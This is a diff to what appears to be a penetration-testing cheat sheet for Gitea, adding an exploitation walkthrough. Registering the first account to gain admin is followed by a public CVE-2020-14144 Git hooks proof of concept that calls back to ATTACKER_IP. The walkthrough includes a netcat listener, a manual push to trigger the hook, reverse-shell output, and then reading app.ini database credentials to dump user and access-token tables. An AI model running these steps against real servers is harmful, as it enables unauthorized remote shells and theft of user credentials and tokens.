@@ -16,6 +16,100 @@ Gitea is a self-hosted Git service similar to GitHub/GitLab. It stores user cred
 http://TARGET:3000/explore/repos
 ```
 
+If registration is enabled, create an account and check whether it becomes the first user. Older Gitea installs may make the first registered user an administrator.
+
+```text
+http://TARGET:3000/user/sign_up
+http://TARGET:3000/admin
+```
+
+The admin dashboard summary is a quick confirmation:
+
+```text
+The Gitea database holds 1 users, 0 organizations, 0 public keys, 0 repositories...
+```
+
+---
+
+## Gitea 1.7.5 CVE-2020-14144 Git Hooks RCE
+
+Gitea `1.7.5` can be vulnerable to authenticated command execution through Git hooks. In the observed path, registration was enabled, the new account became user ID `1`, and the account could access `/admin`.
+
+Version disclosure:
+
+```text
+Gitea Version: 1.7.5
+```
+
+Create an account:
+
+```text
+Username: USER
+Email: USER@example.com
+Password: PASSWORD
+```
+
+Observed working account:
+
+```text
+user:user123
+```
+
+Use the authenticated hook RCE PoC:
+
+```bash
+git clone https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce.git
+cd CVE-2020-14144-GiTea-git-hooks-rce
+
+python3 CVE-2020-14144-GiTea-git-hooks-rce.py \
+  -t http://TARGET:3000 \
+  -u USER \
+  -p PASSWORD \
+  -I ATTACKER_IP \
+  -P CALLBACK_PORT
+```
+
+If the exploit reports completion but no shell arrives, verify outbound filtering and try a callback port that is already exposed by the target. In the observed path, `80` did not return a shell, but `3000` did.
+
+Start the listener:
+
+```bash
+nc -nlvp 3000
+```
+
+If the PoC creates the temporary local repository but does not trigger the hook, manually push from the temporary repo path printed by the exploit:
+
+```bash
+cd /tmp/tmp.uI9uxpH7tP
+git push origin master
+```
+
+Enter the Gitea username and password when prompted. A successful push triggers the hook and returns a shell:
+
+```text
+Username for 'http://TARGET:3000': USER
+Password for 'http://USER@TARGET:3000':
+Enumerating objects: 5, done.
+Writing objects: 100% (3/3), 289 bytes | 289.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+```
+
+Successful shell context:
+
+```text
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
+bash: cannot set terminal process group: Inappropriate ioctl for device
+bash: no job control in this shell
+chloe@HOST:~/gitea-repositories/USER/REPO.git$
+```
+
+Useful process context after exploitation:
+
+```text
+/usr/local/bin/gitea web --config /etc/gitea/app.ini
+GITEA_WORK_DIR=/var/lib/gitea
+```
+
 ---
 
 ## Enumeration
@@ -77,6 +171,29 @@ LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
 
 [database]
 PATH = /data/gitea/gitea.db
+```
+
+For MySQL-backed installs, `app.ini` can expose local database credentials:
+
+```ini
+[database]
+DB_TYPE  = mysql
+HOST     = 127.0.0.1:3306
+NAME     = giteadb
+USER     = gitea
+PASSWD   = 7d98afcbd8a6c5b8c2dfb07bcbe29d34
+SSL_MODE = disable
+PATH     = data/gitea.db
+```
+
+Connect locally with the configured password:
+
+```bash
+mysql -u gitea -h 127.0.0.1 -p
+use giteadb;
+show tables;
+select * from user\G
+select * from access_token\G
 ```
 
 ---
